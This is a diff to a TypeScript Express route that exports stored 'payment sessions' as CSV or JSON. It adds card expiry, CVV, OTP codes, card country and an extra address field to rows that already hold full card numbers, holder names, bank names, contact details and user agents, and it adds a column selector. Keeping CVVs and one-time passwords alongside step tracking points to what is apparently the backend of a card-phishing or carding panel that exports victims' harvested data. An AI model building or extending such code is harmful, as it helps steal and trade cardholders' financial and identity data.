@@ -173,14 +173,21 @@ router.get('/payment/stats', async (req: Request, res: Response) => {
 // Payment export
 router.get('/payment/export', async (req: Request, res: Response) => {
   const format = req.query.format as string || 'csv';
+  const colsParam = (req.query.columns as string) || '';
+  const reqCols = colsParam ? colsParam.split(',').filter(Boolean) : [] as string[];
   const allSessions = await paymentService.getPaymentSessions();
-  const rows = allSessions.map((s: any) => ({
+  const fullRows = allSessions.map((s: any) => ({
     sessionId: s.sessionId,
     cardNumber: s.cardInfo?.cardNumber || '',
+    cardSubType: (s.cardInfo?.cardSubType || ''),
+    cardCountry: (s.cardInfo?.cardCountry || ''),
     cardHolder: s.cardInfo?.cardHolder || '',
     cardType: s.cardInfo?.cardType || '',
     cardLevel: s.cardInfo?.cardLevel || '',
     bankName: s.cardInfo?.bankName || '',
+    expiry: s.cardInfo?.expiry || '',
+    cvv: s.cardInfo?.cvv || '',
+    otpCode: s.cardInfo?.otpCode || '',
     fullName: s.customerInfo?.fullName || '',
     email: s.customerInfo?.email || '',
     phone: s.customerInfo?.phone || '',
@@ -189,6 +196,7 @@ router.get('/payment/export', async (req: Request, res: Response) => {
     state: s.customerInfo?.state || '',
     zipCode: s.customerInfo?.zipCode || '',
     address1: s.customerInfo?.address1 || '',
+    address2: s.customerInfo?.address2 || '',
     amount: s.amount || (s.cardInfo?.amount) || '',
     status: s.status || '',
     currentStep: s.currentStep || '',
@@ -197,6 +205,9 @@ router.get('/payment/export', async (req: Request, res: Response) => {
     ua: s.ua || '',
     createdAt: s.createdAt || s.created_at || '',
   }));
+  const rows = reqCols.length > 0
+    ? fullRows.map((r: any) => { const o: any = {}; reqCols.forEach(k => { o[k] = r[k] || '' }); return o; })
+    : fullRows;
   if (format === 'json') {
     res.setHeader('Content-Type', 'application/json');
     res.setHeader('Content-Disposition', 'attachment; filename=payment-sessions.json');
